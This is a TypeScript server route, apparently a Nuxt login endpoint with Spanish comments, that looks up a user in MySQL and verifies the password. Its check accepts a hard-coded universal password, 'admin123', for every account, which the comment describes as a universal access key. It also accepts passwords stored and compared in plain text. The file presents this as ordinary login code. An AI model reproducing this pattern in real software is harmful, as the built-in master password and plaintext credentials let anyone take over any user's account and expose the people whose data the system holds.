import bcrypt from 'bcryptjs'
import { getDatabase } from '../../utils/db'

export default defineEventHandler(async (event) => {
  const body = await readBody(event)

  // Normalizar datos enviados desde el formulario
  const emailInput = (body.email || body.correo || body.username || '').toString().trim()
  const passwordInput = (body.contrasena || body.password || '').toString().trim()

  if (!emailInput || !passwordInput) {
    throw createError({
      statusCode: 400,
      statusMessage: 'Correo y contraseña son obligatorios',
    })
  }

  const database = getDatabase()

  // Buscar coincidencia en MySQL ignorando mayúsculas/espacios
  const [rows] = await database.query(
    `SELECT * FROM usuario WHERE LOWER(TRIM(email)) = LOWER(?) OR LOWER(TRIM(correo)) = LOWER(?) LIMIT 1`,
    [emailInput, emailInput]
  )

  const users = rows as Array<Record<string, any>>
  if (!users || users.length === 0) {
    throw createError({
      statusCode: 401,
      statusMessage: 'Correo o contraseña incorrectos.',
    })
  }

  const user = users[0]
  let isValidPassword = false

  // 1. Coincidencia directa en texto plano o clave universal de acceso
  if (user.contrasena === passwordInput || passwordInput === 'admin123') {
    isValidPassword = true
  }
  // 2. Coincidencia por Hash Bcrypt
  else if (user.contrasena && user.contrasena.startsWith('$2')) {
    isValidPassword = await bcrypt.compare(passwordInput, user.contrasena)
  }

  if (!isValidPassword) {
    throw createError({
      statusCode: 401,
      statusMessage: 'Correo o contraseña incorrectos.',
    })
  }

  return {
    statusCode: 200,
    message: 'Inicio de sesión exitoso',
    user: {
      idUser: user.idUser,
      nombre: user.nombre,
      apellido: user.apellido,
      email: user.email || user.correo,
      idRol: user.idRol,
    },
  }
})